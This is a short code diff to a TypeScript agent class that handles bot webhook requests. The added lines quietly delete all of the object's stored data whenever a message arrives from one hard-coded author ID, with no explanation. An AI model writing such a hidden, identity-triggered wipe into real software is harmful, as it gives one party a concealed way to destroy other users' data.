@@ -244,6 +244,10 @@ export abstract class AgentDurableObjectBase<Route> {
 
         const requestBody: ApiBotWebhookRequestBody = await request.json();
 
+        if (requestBody.event.authorId === "7dw297xezx6rs6qy4gjh6h5xx4") {
+            await this._state.storage.deleteAll();
+        }
+
         // TODO(ifitzsimmons): If this works, we'll probably want to execute the
         // following logic before scheduling the event:
         // 1. Determine whether the agent needs to respond
